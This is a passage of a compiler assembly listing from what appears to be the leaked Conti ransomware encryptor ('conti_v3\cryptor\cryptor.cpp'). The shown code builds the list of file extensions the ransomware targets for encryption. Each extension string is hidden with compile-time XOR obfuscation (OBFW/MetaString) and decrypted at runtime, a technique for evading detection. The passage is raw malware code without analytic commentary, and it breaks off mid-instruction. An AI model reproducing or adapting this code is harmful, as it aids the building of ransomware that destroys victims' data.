  027bc	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0FD@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ ; MetaBuffer<83,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
  027c1	48 89 85 40 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+528], rax

; 393  : 		OBFW(L".ns2"),

  027c8	48 8d 8d 10 04
	00 00		 lea	 rcx, QWORD PTR $T100[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  027cf	c6 85 10 04 00
	00 00		 mov	 BYTE PTR $T100[rbp-256], 0
  027d6	c6 85 11 04 00
	00 39		 mov	 BYTE PTR $T100[rbp-255], 57 ; 00000039H
  027dd	c6 85 12 04 00
	00 6a		 mov	 BYTE PTR $T100[rbp-254], 106 ; 0000006aH
  027e4	c6 85 13 04 00
	00 21		 mov	 BYTE PTR $T100[rbp-253], 33 ; 00000021H
  027eb	c6 85 14 04 00
	00 6a		 mov	 BYTE PTR $T100[rbp-252], 106 ; 0000006aH
  027f2	c6 85 15 04 00
	00 2f		 mov	 BYTE PTR $T100[rbp-251], 47 ; 0000002fH
  027f9	c6 85 16 04 00
	00 6a		 mov	 BYTE PTR $T100[rbp-250], 106 ; 0000006aH
  02800	c6 85 17 04 00
	00 77		 mov	 BYTE PTR $T100[rbp-249], 119 ; 00000077H
  02807	c6 85 18 04 00
	00 6a		 mov	 BYTE PTR $T100[rbp-248], 106 ; 0000006aH
  0280e	c6 85 19 04 00
	00 6a		 mov	 BYTE PTR $T100[rbp-247], 106 ; 0000006aH
  02815	c6 85 1a 04 00
	00 6a		 mov	 BYTE PTR $T100[rbp-246], 106 ; 0000006aH
  0281c	0f b6 85 11 04
	00 00		 movzx	 eax, BYTE PTR $T100[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 393  : 		OBFW(L".ns2"),

  02823	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  02828	48 89 85 48 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+536], rax

; 394  : 		OBFW(L".ns3"),

  0282f	48 8d 8d 20 04
	00 00		 lea	 rcx, QWORD PTR $T101[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  02836	c6 85 20 04 00
	00 00		 mov	 BYTE PTR $T101[rbp-256], 0
  0283d	c6 85 21 04 00
	00 25		 mov	 BYTE PTR $T101[rbp-255], 37 ; 00000025H
  02844	c6 85 22 04 00
	00 03		 mov	 BYTE PTR $T101[rbp-254], 3
  0284b	c6 85 23 04 00
	00 07		 mov	 BYTE PTR $T101[rbp-253], 7
  02852	c6 85 24 04 00
	00 03		 mov	 BYTE PTR $T101[rbp-252], 3
  02859	c6 85 25 04 00
	00 58		 mov	 BYTE PTR $T101[rbp-251], 88 ; 00000058H
  02860	c6 85 26 04 00
	00 03		 mov	 BYTE PTR $T101[rbp-250], 3
  02867	c6 85 27 04 00
	00 76		 mov	 BYTE PTR $T101[rbp-249], 118 ; 00000076H
  0286e	c6 85 28 04 00
	00 03		 mov	 BYTE PTR $T101[rbp-248], 3
  02875	c6 85 29 04 00
	00 03		 mov	 BYTE PTR $T101[rbp-247], 3
  0287c	c6 85 2a 04 00
	00 03		 mov	 BYTE PTR $T101[rbp-246], 3
  02883	0f b6 85 21 04
	00 00		 movzx	 eax, BYTE PTR $T101[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 394  : 		OBFW(L".ns3"),

  0288a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0ED@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<67,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0288f	48 89 85 50 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+544], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  02896	c6 85 30 04 00
	00 00		 mov	 BYTE PTR $T102[rbp-256], 0
  0289d	c6 85 31 04 00
	00 7c		 mov	 BYTE PTR $T102[rbp-255], 124 ; 0000007cH
  028a4	c6 85 32 04 00
	00 0c		 mov	 BYTE PTR $T102[rbp-254], 12
  028ab	c6 85 33 04 00
	00 46		 mov	 BYTE PTR $T102[rbp-253], 70 ; 00000046H
  028b2	c6 85 34 04 00
	00 0c		 mov	 BYTE PTR $T102[rbp-252], 12
  028b9	c6 85 35 04 00
	00 26		 mov	 BYTE PTR $T102[rbp-251], 38 ; 00000026H
  028c0	c6 85 36 04 00
	00 0c		 mov	 BYTE PTR $T102[rbp-250], 12
  028c7	c6 85 37 04 00
	00 6f		 mov	 BYTE PTR $T102[rbp-249], 111 ; 0000006fH

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  028ce	c6 85 38 04 00
	00 0c		 mov	 BYTE PTR $T102[rbp-248], 12
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 395  : 		OBFW(L".ns4"),

  028d5	48 8d 8d 30 04
	00 00		 lea	 rcx, QWORD PTR $T102[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  028dc	c6 85 39 04 00
	00 0c		 mov	 BYTE PTR $T102[rbp-247], 12
  028e3	c6 85 3a 04 00
	00 0c		 mov	 BYTE PTR $T102[rbp-246], 12
  028ea	0f b6 85 31 04
	00 00		 movzx	 eax, BYTE PTR $T102[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 395  : 		OBFW(L".ns4"),

  028f1	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BD@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<19,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  028f6	48 89 85 58 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+552], rax

; 396  : 		OBFW(L".nsf"),

  028fd	48 8d 8d 40 04
	00 00		 lea	 rcx, QWORD PTR $T103[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  02904	c6 85 40 04 00
	00 00		 mov	 BYTE PTR $T103[rbp-256], 0
  0290b	c6 85 41 04 00
	00 42		 mov	 BYTE PTR $T103[rbp-255], 66 ; 00000042H
  02912	c6 85 42 04 00
	00 31		 mov	 BYTE PTR $T103[rbp-254], 49 ; 00000031H
  02919	c6 85 43 04 00
	00 33		 mov	 BYTE PTR $T103[rbp-253], 51 ; 00000033H
  02920	c6 85 44 04 00
	00 31		 mov	 BYTE PTR $T103[rbp-252], 49 ; 00000031H
  02927	c6 85 45 04 00
	00 1c		 mov	 BYTE PTR $T103[rbp-251], 28
  0292e	c6 85 46 04 00
	00 31		 mov	 BYTE PTR $T103[rbp-250], 49 ; 00000031H
  02935	c6 85 47 04 00
	00 25		 mov	 BYTE PTR $T103[rbp-249], 37 ; 00000025H
  0293c	c6 85 48 04 00
	00 31		 mov	 BYTE PTR $T103[rbp-248], 49 ; 00000031H
  02943	c6 85 49 04 00
	00 31		 mov	 BYTE PTR $T103[rbp-247], 49 ; 00000031H
  0294a	c6 85 4a 04 00
	00 31		 mov	 BYTE PTR $T103[rbp-246], 49 ; 00000031H
  02951	0f b6 85 41 04
	00 00		 movzx	 eax, BYTE PTR $T103[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 396  : 		OBFW(L".nsf"),

  02958	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GB@$0DB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<97,49,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0295d	48 89 85 60 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+560], rax

; 397  : 		OBFW(L".nv"),

  02964	48 8d 4c 24 40	 lea	 rcx, QWORD PTR $T104[rsp]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  02969	c6 44 24 40 00	 mov	 BYTE PTR $T104[rsp], 0
  0296e	c6 44 24 41 62	 mov	 BYTE PTR $T104[rsp+1], 98 ; 00000062H
  02973	c6 44 24 42 1e	 mov	 BYTE PTR $T104[rsp+2], 30
  02978	c6 44 24 43 26	 mov	 BYTE PTR $T104[rsp+3], 38 ; 00000026H
  0297d	c6 44 24 44 1e	 mov	 BYTE PTR $T104[rsp+4], 30
  02982	c6 44 24 45 5e	 mov	 BYTE PTR $T104[rsp+5], 94 ; 0000005eH
  02987	c6 44 24 46 1e	 mov	 BYTE PTR $T104[rsp+6], 30
  0298c	c6 44 24 47 1e	 mov	 BYTE PTR $T104[rsp+7], 30
  02991	c6 44 24 48 1e	 mov	 BYTE PTR $T104[rsp+8], 30
  02996	0f b6 44 24 41	 movzx	 eax, BYTE PTR $T104[rsp+1]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 397  : 		OBFW(L".nv"),

  0299b	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$06$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ ; MetaBuffer<7,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
  029a0	48 89 85 68 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+568], rax

; 398  : 		OBFW(L".nv2"),

  029a7	48 8d 8d 50 04
	00 00		 lea	 rcx, QWORD PTR $T105[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  029ae	c6 85 50 04 00
	00 00		 mov	 BYTE PTR $T105[rbp-256], 0
  029b5	c6 85 51 04 00
	00 19		 mov	 BYTE PTR $T105[rbp-255], 25
  029bc	c6 85 52 04 00
	00 7b		 mov	 BYTE PTR $T105[rbp-254], 123 ; 0000007bH
  029c3	c6 85 53 04 00
	00 68		 mov	 BYTE PTR $T105[rbp-253], 104 ; 00000068H
  029ca	c6 85 54 04 00
	00 7b		 mov	 BYTE PTR $T105[rbp-252], 123 ; 0000007bH
  029d1	c6 85 55 04 00
	00 62		 mov	 BYTE PTR $T105[rbp-251], 98 ; 00000062H
  029d8	c6 85 56 04 00
	00 7b		 mov	 BYTE PTR $T105[rbp-250], 123 ; 0000007bH
  029df	c6 85 57 04 00
	00 16		 mov	 BYTE PTR $T105[rbp-249], 22
  029e6	c6 85 58 04 00
	00 7b		 mov	 BYTE PTR $T105[rbp-248], 123 ; 0000007bH
  029ed	c6 85 59 04 00
	00 7b		 mov	 BYTE PTR $T105[rbp-247], 123 ; 0000007bH
  029f4	c6 85 5a 04 00
	00 7b		 mov	 BYTE PTR $T105[rbp-246], 123 ; 0000007bH
  029fb	0f b6 85 51 04
	00 00		 movzx	 eax, BYTE PTR $T105[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 398  : 		OBFW(L".nv2"),

  02a02	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BP@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<31,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  02a07	48 89 85 70 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+576], rax

; 399  : 		OBFW(L".nwdb"),

  02a0e	48 8d 8d 10 08
	00 00		 lea	 rcx, QWORD PTR $T106[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  02a15	c6 85 10 08 00
	00 00		 mov	 BYTE PTR $T106[rbp-256], 0
  02a1c	c6 85 11 08 00
	00 37		 mov	 BYTE PTR $T106[rbp-255], 55 ; 00000037H
  02a23	c6 85 12 08 00
	00 76		 mov	 BYTE PTR $T106[rbp-254], 118 ; 00000076H
  02a2a	c6 85 13 08 00
	00 06		 mov	 BYTE PTR $T106[rbp-253], 6
  02a31	c6 85 14 08 00
	00 76		 mov	 BYTE PTR $T106[rbp-252], 118 ; 00000076H
  02a38	c6 85 15 08 00
	00 0d		 mov	 BYTE PTR $T106[rbp-251], 13
  02a3f	c6 85 16 08 00
	00 76		 mov	 BYTE PTR $T106[rbp-250], 118 ; 00000076H
  02a46	c6 85 17 08 00
	00 61		 mov	 BYTE PTR $T106[rbp-249], 97 ; 00000061H
  02a4d	c6 85 18 08 00
	00 76		 mov	 BYTE PTR $T106[rbp-248], 118 ; 00000076H
  02a54	c6 85 19 08 00
	00 27		 mov	 BYTE PTR $T106[rbp-247], 39 ; 00000027H
  02a5b	c6 85 1a 08 00
	00 76		 mov	 BYTE PTR $T106[rbp-246], 118 ; 00000076H
  02a62	c6 85 1b 08 00
	00 76		 mov	 BYTE PTR $T106[rbp-245], 118 ; 00000076H
  02a69	c6 85 1c 08 00
	00 76		 mov	 BYTE PTR $T106[rbp-244], 118 ; 00000076H
  02a70	0f b6 85 11 08
	00 00		 movzx	 eax, BYTE PTR $T106[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 399  : 		OBFW(L".nwdb"),

  02a77	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BN@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<29,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
  02a7c	48 89 85 78 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+584], rax

; 400  : 		OBFW(L".nyf"),

  02a83	48 8d 8d 60 04
	00 00		 lea	 rcx, QWORD PTR $T107[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  02a8a	c6 85 60 04 00
	00 00		 mov	 BYTE PTR $T107[rbp-256], 0
  02a91	c6 85 61 04 00
	00 4d		 mov	 BYTE PTR $T107[rbp-255], 77 ; 0000004dH
  02a98	c6 85 62 04 00
	00 39		 mov	 BYTE PTR $T107[rbp-254], 57 ; 00000039H
  02a9f	c6 85 63 04 00
	00 16		 mov	 BYTE PTR $T107[rbp-253], 22
  02aa6	c6 85 64 04 00
	00 39		 mov	 BYTE PTR $T107[rbp-252], 57 ; 00000039H
  02aad	c6 85 65 04 00
	00 52		 mov	 BYTE PTR $T107[rbp-251], 82 ; 00000052H
  02ab4	c6 85 66 04 00
	00 39		 mov	 BYTE PTR $T107[rbp-250], 57 ; 00000039H
  02abb	c6 85 67 04 00
	00 0d		 mov	 BYTE PTR $T107[rbp-249], 13
  02ac2	c6 85 68 04 00
	00 39		 mov	 BYTE PTR $T107[rbp-248], 57 ; 00000039H
  02ac9	c6 85 69 04 00
	00 39		 mov	 BYTE PTR $T107[rbp-247], 57 ; 00000039H
  02ad0	c6 85 6a 04 00
	00 39		 mov	 BYTE PTR $T107[rbp-246], 57 ; 00000039H
  02ad7	0f b6 85 61 04
	00 00		 movzx	 eax, BYTE PTR $T107[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 400  : 		OBFW(L".nyf"),

  02ade	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<17,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  02ae3	48 89 85 80 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+592], rax

; 401  : 		OBFW(L".odb"),

  02aea	48 8d 8d 70 04
	00 00		 lea	 rcx, QWORD PTR $T108[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  02af1	c6 85 70 04 00
	00 00		 mov	 BYTE PTR $T108[rbp-256], 0
  02af8	c6 85 71 04 00
	00 37		 mov	 BYTE PTR $T108[rbp-255], 55 ; 00000037H
  02aff	c6 85 72 04 00
	00 6c		 mov	 BYTE PTR $T108[rbp-254], 108 ; 0000006cH
  02b06	c6 85 73 04 00
	00 10		 mov	 BYTE PTR $T108[rbp-253], 16
  02b0d	c6 85 74 04 00
	00 6c		 mov	 BYTE PTR $T108[rbp-252], 108 ; 0000006cH
  02b14	c6 85 75 04 00
	00 30		 mov	 BYTE PTR $T108[rbp-251], 48 ; 00000030H
  02b1b	c6 85 76 04 00
	00 6c		 mov	 BYTE PTR $T108[rbp-250], 108 ; 0000006cH
  02b22	c6 85 77 04 00
	00 64		 mov	 BYTE PTR $T108[rbp-249], 100 ; 00000064H
  02b29	c6 85 78 04 00
	00 6c		 mov	 BYTE PTR $T108[rbp-248], 108 ; 0000006cH
  02b30	c6 85 79 04 00
	00 6c		 mov	 BYTE PTR $T108[rbp-247], 108 ; 0000006cH
  02b37	c6 85 7a 04 00
	00 6c		 mov	 BYTE PTR $T108[rbp-246], 108 ; 0000006cH
  02b3e	0f b6 85 71 04
	00 00		 movzx	 eax, BYTE PTR $T108[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 401  : 		OBFW(L".odb"),

  02b45	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GF@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<101,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  02b4a	48 89 85 88 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+600], rax

; 402  : 		OBFW(L".oqy"),

  02b51	48 8d 8d 80 04
	00 00		 lea	 rcx, QWORD PTR $T109[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  02b58	c6 85 80 04 00
	00 00		 mov	 BYTE PTR $T109[rbp-256], 0
  02b5f	c6 85 81 04 00
	00 2a		 mov	 BYTE PTR $T109[rbp-255], 42 ; 0000002aH
  02b66	c6 85 82 04 00
	00 3d		 mov	 BYTE PTR $T109[rbp-254], 61 ; 0000003dH
  02b6d	c6 85 83 04 00
	00 28		 mov	 BYTE PTR $T109[rbp-253], 40 ; 00000028H
  02b74	c6 85 84 04 00
	00 3d		 mov	 BYTE PTR $T109[rbp-252], 61 ; 0000003dH
  02b7b	c6 85 85 04 00
	00 7a		 mov	 BYTE PTR $T109[rbp-251], 122 ; 0000007aH
  02b82	c6 85 86 04 00
	00 3d		 mov	 BYTE PTR $T109[rbp-250], 61 ; 0000003dH
  02b89	c6 85 87 04 00
	00 45		 mov	 BYTE PTR $T109[rbp-249], 69 ; 00000045H
  02b90	c6 85 88 04 00
	00 3d		 mov	 BYTE PTR $T109[rbp-248], 61 ; 0000003dH
  02b97	c6 85 89 04 00
	00 3d		 mov	 BYTE PTR $T109[rbp-247], 61 ; 0000003dH
  02b9e	c6 85 8a 04 00
	00 3d		 mov	 BYTE PTR $T109[rbp-246], 61 ; 0000003dH
  02ba5	0f b6 85 81 04
	00 00		 movzx	 eax, BYTE PTR $T109[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 402  : 		OBFW(L".oqy"),

  02bac	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CJ@$0DN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<41,61,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  02bb1	48 89 85 90 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+608], rax

; 403  : 		OBFW(L".orx"),

  02bb8	48 8d 8d 90 04
	00 00		 lea	 rcx, QWORD PTR $T110[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  02bbf	c6 85 90 04 00
	00 00		 mov	 BYTE PTR $T110[rbp-256], 0
  02bc6	c6 85 91 04 00
	00 23		 mov	 BYTE PTR $T110[rbp-255], 35 ; 00000023H
  02bcd	c6 85 92 04 00
	00 54		 mov	 BYTE PTR $T110[rbp-254], 84 ; 00000054H
  02bd4	c6 85 93 04 00
	00 5a		 mov	 BYTE PTR $T110[rbp-253], 90 ; 0000005aH
  02bdb	c6 85 94 04 00
	00 54		 mov	 BYTE PTR $T110[rbp-252], 84 ; 00000054H
  02be2	c6 85 95 04 00
	00 49		 mov	 BYTE PTR $T110[rbp-251], 73 ; 00000049H
  02be9	c6 85 96 04 00
	00 54		 mov	 BYTE PTR $T110[rbp-250], 84 ; 00000054H
  02bf0	c6 85 97 04 00
	00 27		 mov	 BYTE PTR $T110[rbp-249], 39 ; 00000027H
  02bf7	c6 85 98 04 00
	00 54		 mov	 BYTE PTR $T110[rbp-248], 84 ; 00000054H
  02bfe	c6 85 99 04 00
	00 54		 mov	 BYTE PTR $T110[rbp-247], 84 ; 00000054H
  02c05	c6 85 9a 04 00
	00 54		 mov	 BYTE PTR $T110[rbp-246], 84 ; 00000054H
  02c0c	0f b6 85 91 04
	00 00		 movzx	 eax, BYTE PTR $T110[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 403  : 		OBFW(L".orx"),

  02c13	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EP@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<79,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  02c18	48 89 85 98 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+616], rax

; 404  : 		OBFW(L".owc"),

  02c1f	48 8d 8d a0 04
	00 00		 lea	 rcx, QWORD PTR $T111[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  02c26	c6 85 a0 04 00
	00 00		 mov	 BYTE PTR $T111[rbp-256], 0
  02c2d	c6 85 a1 04 00
	00 1b		 mov	 BYTE PTR $T111[rbp-255], 27
  02c34	c6 85 a2 04 00
	00 5d		 mov	 BYTE PTR $T111[rbp-254], 93 ; 0000005dH
  02c3b	c6 85 a3 04 00
	00 00		 mov	 BYTE PTR $T111[rbp-253], 0
  02c42	c6 85 a4 04 00
	00 5d		 mov	 BYTE PTR $T111[rbp-252], 93 ; 0000005dH
  02c49	c6 85 a5 04 00
	00 6e		 mov	 BYTE PTR $T111[rbp-251], 110 ; 0000006eH
  02c50	c6 85 a6 04 00
	00 5d		 mov	 BYTE PTR $T111[rbp-250], 93 ; 0000005dH
  02c57	c6 85 a7 04 00
	00 59		 mov	 BYTE PTR $T111[rbp-249], 89 ; 00000059H
  02c5e	c6 85 a8 04 00
	00 5d		 mov	 BYTE PTR $T111[rbp-248], 93 ; 0000005dH
  02c65	c6 85 a9 04 00
	00 5d		 mov	 BYTE PTR $T111[rbp-247], 93 ; 0000005dH
  02c6c	c6 85 aa 04 00
	00 5d		 mov	 BYTE PTR $T111[rbp-246], 93 ; 0000005dH
  02c73	0f b6 85 a1 04
	00 00		 movzx	 eax, BYTE PTR $T111[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 404  : 		OBFW(L".owc"),

  02c7a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GN@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<109,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  02c7f	48 89 85 a0 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+624], rax

; 405  : 		OBFW(L".p96"),

  02c86	48 8d 8d b0 04
	00 00		 lea	 rcx, QWORD PTR $T112[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  02c8d	c6 85 b0 04 00
	00 00		 mov	 BYTE PTR $T112[rbp-256], 0
  02c94	c6 85 b1 04 00
	00 64		 mov	 BYTE PTR $T112[rbp-255], 100 ; 00000064H
  02c9b	c6 85 b2 04 00
	00 04		 mov	 BYTE PTR $T112[rbp-254], 4
  02ca2	c6 85 b3 04 00
	00 32		 mov	 BYTE PTR $T112[rbp-253], 50 ; 00000032H
  02ca9	c6 85 b4 04 00
	00 04		 mov	 BYTE PTR $T112[rbp-252], 4
  02cb0	c6 85 b5 04 00
	00 07		 mov	 BYTE PTR $T112[rbp-251], 7
  02cb7	c6 85 b6 04 00
	00 04		 mov	 BYTE PTR $T112[rbp-250], 4
  02cbe	c6 85 b7 04 00
	00 43		 mov	 BYTE PTR $T112[rbp-249], 67 ; 00000043H
  02cc5	c6 85 b8 04 00
	00 04		 mov	 BYTE PTR $T112[rbp-248], 4
  02ccc	c6 85 b9 04 00
	00 04		 mov	 BYTE PTR $T112[rbp-247], 4
  02cd3	c6 85 ba 04 00
	00 04		 mov	 BYTE PTR $T112[rbp-246], 4
  02cda	0f b6 85 b1 04
	00 00		 movzx	 eax, BYTE PTR $T112[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 405  : 		OBFW(L".p96"),

  02ce1	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GL@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<107,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  02ce6	48 89 85 a8 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+632], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  02ced	c6 85 c0 04 00
	00 00		 mov	 BYTE PTR $T113[rbp-256], 0
  02cf4	c6 85 c1 04 00
	00 01		 mov	 BYTE PTR $T113[rbp-255], 1
  02cfb	c6 85 c2 04 00
	00 6f		 mov	 BYTE PTR $T113[rbp-254], 111 ; 0000006fH
  02d02	c6 85 c3 04 00
	00 35		 mov	 BYTE PTR $T113[rbp-253], 53 ; 00000035H
  02d09	c6 85 c4 04 00
	00 6f		 mov	 BYTE PTR $T113[rbp-252], 111 ; 0000006fH

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  02d10	c6 85 c5 04 00
	00 34		 mov	 BYTE PTR $T113[rbp-251], 52 ; 00000034H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 406  : 		OBFW(L".p97"),

  02d17	48 8d 8d c0 04
	00 00		 lea	 rcx, QWORD PTR $T113[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  02d1e	c6 85 c6 04 00
	00 6f		 mov	 BYTE PTR $T113[rbp-250], 111 ; 0000006fH
  02d25	c6 85 c7 04 00
	00 70		 mov	 BYTE PTR $T113[rbp-249], 112 ; 00000070H
  02d2c	c6 85 c8 04 00
	00 6f		 mov	 BYTE PTR $T113[rbp-248], 111 ; 0000006fH
  02d33	c6 85 c9 04 00
	00 6f		 mov	 BYTE PTR $T113[rbp-247], 111 ; 0000006fH
  02d3a	c6 85 ca 04 00
	00 6f		 mov	 BYTE PTR $T113[rbp-246], 111 ; 0000006fH
  02d41	0f b6 85 c1 04
	00 00		 movzx	 eax, BYTE PTR $T113[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 406  : 		OBFW(L".p97"),

  02d48	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<97,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  02d4d	48 89 85 b0 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+640], rax

; 407  : 		OBFW(L".pan"),

  02d54	48 8d 8d d0 04
	00 00		 lea	 rcx, QWORD PTR $T114[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  02d5b	c6 85 d0 04 00
	00 00		 mov	 BYTE PTR $T114[rbp-256], 0
  02d62	c6 85 d1 04 00
